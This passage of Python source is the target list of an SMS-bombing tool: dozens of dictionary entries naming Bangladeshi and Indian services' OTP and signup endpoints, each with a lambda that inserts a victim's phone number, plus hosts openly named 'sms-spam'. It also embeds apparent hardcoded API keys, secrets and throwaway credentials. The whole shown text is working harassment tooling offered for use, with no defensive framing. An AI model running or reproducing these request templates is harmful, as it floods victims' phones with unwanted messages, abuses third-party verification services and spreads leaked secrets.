        "data": lambda phone: f'{{"phone":"+88{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}}'
    },
    {
        "name": "API-33",
        "type": "SMS",
        "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "API-34",
        "type": "SMS",
        "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "API-35",
        "type": "SMS",
        "url": "https://auth.qcoom.com/api/v1/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"+88{phone}"}}'
    },
    {
        "name": "API-36",
        "type": "SMS",
        "url": "https://api.garibookadmin.com/api/v4/user/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}}'
    },
    {
        "name": "API-37",
        "type": "SMS",
        "url": "https://training.gov.bd/backoffice/api/user/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "API-38",
        "type": "SMS",
        "url": "https://api.shikho.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"ap-discount-request"}}'
    },
    {
        "name": "API-39",
        "type": "SMS",
        "url": "https://core.easy.com.bd/api/v1/registration",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"apkzone2.0info@gmail.com","mobile":"{phone}","password":"amitusar","password_confirmation":"amitusar","device_key":"b2c8ddd3be..."}}'
    },
    {
        "name": "API-40",
        "type": "SMS",
        "url": "https://da-api.robi.com.bd/da-nll/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "API-41",
        "type": "SMS",
        "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","requestType":"send","emailConsent":true,"whatsappConsent":true}}'
    },
    {
        "name": "API-42",
        "type": "SMS",
        "url": "https://app.addatimes.com/api/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"BD"}}'
    },
    {
        "name": "API-43",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/otp-generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","verification_code":""}}'
    },
    {
        "name": "API-44",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"User","email":"user@example.com","phone":"{phone}","password":"password123"}}'
    },
    {
        "name": "API-45",
        "type": "SMS",
        "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"email":"apkzone2.0@gmail.com","phone_number":"88{phone}"}}'
    },
    {
        "name": "API-46",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/otp-request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "API-47",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/regnewcustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"fukc@gmail.com","phone":"{phone}","password":"aAeMY@5hG8iUfD4","password_confirmation":"aAeMY@5hG8iUfD4"}}'
    },
    {
        "name": "API-48",
        "type": "SMS",
        "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"device_uuid":"...","firebase_token":"...","geo_location":"...","mno":"Grameenphone","wallet_number":"{phone}"}}'
    },
    {
        "name": "API-49",
        "type": "SMS",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"+880{phone}"}}'
    },
    {
        "name": "API-50",
        "type": "SMS",
        "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}&fcmToken=&referral="
    },
    {
        "name": "API-51",
        "type": "SMS",
        "url": "https://www.pkluck2.com/wps/verification/sms/noLogin",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNum":"{phone}","countryDialingCode":"880"}}'
    },
    {
        "name": "API-52",
        "type": "SMS",
        "url": "https://applink.com.bd/appstore-v4-server/login/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"880{phone}"}}'
    },
    {
        "name": "API-53",
        "type": "SMS",
        "url": "https://newprod.api-care-box.click:444/api/user/register/?version=otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"Name":"Abdullah Al Mamun","Phone":"+880{phone}"}}'
    },
    {
        "name": "API-54",
        "type": "SMS",
        "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_no":"{phone}"}}'
    },
    {
        "name": "API-55",
        "type": "SMS",
        "url": "https://www.jayabajibd.life/api/register/confirm",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileno":"{phone}","username":"abffjddngf864","firstname":"","new_password":"tPNVOcen!6XEz3b","confirm_new_password":"tPNVOcen!6XEz3b","country_code":"880","country":"BD","currency":"BDT","ref":"","language":"en"}}'
    },
    {
        "name": "API-56",
        "type": "SMS",
        "url": "https://api.swap.com.bd/api/v1/send-otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "API-57",
        "type": "SMS",
        "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+880{phone}"}}'
    },
    {
        "name": "API-58",
        "type": "SMS",
        "url": "https://ss.binge.buzz/otp/send/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "API-59",
        "type": "SMS",
        "url": "https://sendmysms.net/send-otp.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phonenumber={phone}"
    },
    {
        "name": "API-60",
        "type": "SMS",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"auth_type":"login","phone":"{phone}","vendor":"shikho","type":"student"}}'
    },
    {
        "name": "API-61",
        "type": "SMS",
        "url": "https://app.eonbazar.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"method":"otp","mobile":"{phone}"}}'
    },
    {
        "name": "API-62",
        "type": "SMS",
        "url": "http://nesco.sslwireless.com/api/v1/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}"}}'
    },
    {
        "name": "API-63",
        "type": "SMS",
        "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+880","phone":"{phone}"}}'
    },
    {
        "name": "API-64",
        "type": "SMS",
        "url": "https://www.bazar365.store/api/v1/auth/sendPhoneOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "API-65",
        "type": "SMS",
        "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "Wakefit SMS",
        "type": "SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
        {
        "name": "APU Inky API",
        "type": "SMS",
        "url": lambda phone: f"https://apu-inky.vercel.app/send?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Hungama OTP",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Doubtnut",
        "type": "SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "type": "SMS", 
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "BeepKart",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Smytten",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "MyHubble Money",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Housing.com",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "RentoMojo",
        "type": "SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Khatabook",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Animall",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "Cosmofeed",
        "type": "SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Spencer's",
        "type": "SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # --- GET Method APIs ---
    {
        "name": "Bikroy.com",
        "type": "SMS",
        "url": lambda phone: f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Grameenphone MyGP",
        "type": "SMS",
        "url": lambda phone: f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Shukhee.com",
        "type": "SMS",
        "url": lambda phone: f"https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "MedEasy Health",
        "type": "SMS",
        "url": lambda phone: f"https://api.medeasy.health/api/send-otp/+88{phone}/",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Ultranet API",
        "type": "SMS",
        "url": lambda phone: f"http://ultranetrn.com.br/fonts/api.php?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "eCourier API",
        "type": "SMS",
        "url": lambda phone: f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Binge.buzz GET",
        "type": "SMS",
        "url": lambda phone: f"https://ss.binge.buzz/otp/send/login{phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Daktarbhai",
        "type": "SMS",
        "url": lambda phone: f"https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login",
        "method": "GET",
        "headers": {},
        "data": None
    },

    # --- POST Method APIs ---
    {
        "name": "Deshal.net",
        "type": "SMS",
        "url": "https://app.deshal.net/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Grameenphone Web Login",
        "type": "SMS",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "Grameenphone (FWA / Bkash)",
        "type": "SMS",
        "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"","language":"en"}}'
    },
    {
        "name": "BusBD.com.bd",
        "type": "SMS",
        "url": "https://api.busbd.com.bd/api/auth",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+88{phone}"}}'
    },
    {
        "name": "Paperfly",
        "type": "SMS",
        "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"full_name":"Apk","email_address":"apkzone2.0@gmail.com","company_name":"Ahgbd","phone_number":"{phone}"}}'
    },
    {
        "name": "OsudPotro.com",
        "type": "SMS",
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","deviceToken":"web","language":"en","os":"web"}}'
    },
    {
        "name": "Apex4u.com",
        "type": "SMS",
        "url": "https://api.apex4u.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
    },
    {
        "name": "Bohubrihi.com",
        "type": "SMS",
        "url": "https://bb-api.bohubrihi.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"login"}}'
    },
    {
        "name": "Fundesh.com.bd",
        "type": "SMS",
        "url": "https://fundesh.com.bd/api/auth/generateOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "Jatri / JSLGlobal",
        "type": "SMS",
        "url": "https://user-api.jslglobal.co/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+88{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}}'
    },
    {
        "name": "RedX",
        "type": "SMS",
        "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "RabbitHoleBD",
        "type": "SMS",
        "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "Qcoom.com",
        "type": "SMS",
        "url": "https://auth.qcoom.com/api/v1/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"+88{phone}"}}'
    },
    {
        "name": "Garibookadmin.com",
        "type": "SMS",
        "url": "https://api.garibookadmin.com/api/v4/user/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}}'
    },
    {
        "name": "Training.gov.bd",
        "type": "SMS",
        "url": "https://training.gov.bd/backoffice/api/user/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Shikho.com Discount Request",
        "type": "SMS",
        "url": "https://api.shikho.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"ap-discount-request"}}'
    },
    {
        "name": "Easy.com.bd",
        "type": "SMS",
        "url": "https://core.easy.com.bd/api/v1/registration",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"apkzone2.0info@gmail.com","mobile":"{phone}","password":"amitusar","password_confirmation":"amitusar","device_key":"b2c8ddd3be..."}}'
    },
    {
        "name": "Robi DA API",
        "type": "SMS",
        "url": "https://da-api.robi.com.bd/da-nll/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "Hoichoi (Viewlift)",
        "type": "SMS",
        "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","requestType":"send","emailConsent":true,"whatsappConsent":true}}'
    },
    {
        "name": "Addatimes.com",
        "type": "SMS",
        "url": "https://app.addatimes.com/api/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"BD"}}'
    },
    {
        "name": "Regal Furniture OTP",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/otp-generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","verification_code":""}}'
    },
    {
        "name": "Regal Furniture Register",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"User","email":"user@example.com","phone":"{phone}","password":"password123"}}'
    },
    {
        "name": "DeeptoPlay.com",
        "type": "SMS",
        "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"email":"apkzone2.0@gmail.com","phone_number":"88{phone}"}}'
    },
    {
        "name": "TimezoneBD OTP",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/otp-request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "TimezoneBD Register",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/regnewcustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"fukc@gmail.com","phone":"{phone}","password":"aAeMY@5hG8iUfD4","password_confirmation":"aAeMY@5hG8iUfD4"}}'
    },
    {
        "name": "UpaySystem",
        "type": "SMS",
        "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"device_uuid":"...","firebase_token":"...","geo_location":"...","mno":"Grameenphone","wallet_number":"{phone}"}}'
    },
    {
        "name": "Chorki.com",
        "type": "SMS",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"+880{phone}"}}'
    },
    {
        "name": "Arogga.com",
        "type": "SMS",
        "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}&fcmToken=&referral="
    },
    {
        "name": "Pkluck2",
        "type": "SMS",
        "url": "https://www.pkluck2.com/wps/verification/sms/noLogin",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNum":"{phone}","countryDialingCode":"880"}}'
    },
    {
        "name": "AppLink",
        "type": "SMS",
        "url": "https://applink.com.bd/appstore-v4-server/login/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"880{phone}"}}'
    },
    {
        "name": "Care-Box",
        "type": "SMS",
        "url": "https://newprod.api-care-box.click:444/api/user/register/?version=otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"Name":"Abdullah Al Mamun","Phone":"+880{phone}"}}'
    },
    {
        "name": "Ghoori Learning",
        "type": "SMS",
        "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_no":"{phone}"}}'
    },
    {
        "name": "Jayabaji BD",
        "type": "SMS",
        "url": "https://www.jayabajibd.life/api/register/confirm",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileno":"{phone}","username":"abffjddngf864","firstname":"","new_password":"tPNVOcen!6XEz3b","confirm_new_password":"tPNVOcen!6XEz3b","country_code":"880","country":"BD","currency":"BDT","ref":"","language":"en"}}'
    },
    {
        "name": "Swap.com.bd",
        "type": "SMS",
        "url": "https://api.swap.com.bd/api/v1/send-otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BdTickets.com",
        "type": "SMS",
        "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+880{phone}"}}'
    },
    {
        "name": "Binge.buzz POST",
        "type": "SMS",
        "url": "https://ss.binge.buzz/otp/send/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "SendMySMS",
        "type": "SMS",
        "url": "https://sendmysms.net/send-otp.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phonenumber={phone}"
    },
    {
        "name": "Shikho.com Student Login",
        "type": "SMS",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"auth_type":"login","phone":"{phone}","vendor":"shikho","type":"student"}}'
    },
    {
        "name": "Eonbazar",
        "type": "SMS",
        "url": "https://app.eonbazar.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"method":"otp","mobile":"{phone}"}}'
    },
    {
        "name": "NESCO SSL Wireless",
        "type": "SMS",
        "url": "http://nesco.sslwireless.com/api/v1/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}"}}'
    },
    {
        "name": "Quizgiri",
        "type": "SMS",
        "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+880","phone":"{phone}"}}'
    },
    {
        "name": "Bazar365",
        "type": "SMS",
        "url": "https://www.bazar365.store/api/v1/auth/sendPhoneOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "Bioscopelive Alternative",
        "type": "SMS",
        "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "LMNX9 API 1",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api1?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 2",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api2?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 3",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api3?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 4",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api4?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 5",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api5?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 6",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api6?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 7",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api7?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 8",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api8?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 9",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api9?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 10",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api10?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 11",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api11?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 12",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api12?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 13",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api13?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 14",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api14?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 15",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api15?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 16",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api16?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 17",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api17?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 18",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api18?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 19",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api19?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 20",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api20?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 21",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api21?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 22",
        "type": "SMS",
